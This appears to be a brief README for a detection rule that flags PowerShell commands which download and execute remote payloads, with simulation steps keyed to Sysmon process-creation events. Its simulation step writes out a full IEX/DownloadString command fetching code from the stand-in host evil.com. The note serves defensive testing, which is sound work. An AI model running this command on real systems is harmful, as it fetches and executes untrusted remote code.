# Remote Threat Detection Rule

**Purpose:**  
Detects PowerShell commands used to download & execute payloads remotely.

**Simulation Steps:**  
- Run: `powershell -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/mal')"`
- Look for encoded commands or suspicious URLs
- Trigger via Sysmon Event ID 1 (Process Creation)

**Screenshot:**  
![Image](https://github.com/user-attachments/assets/1c2c760e-b4bf-4c81-833e-d76d9dbb7e19) 

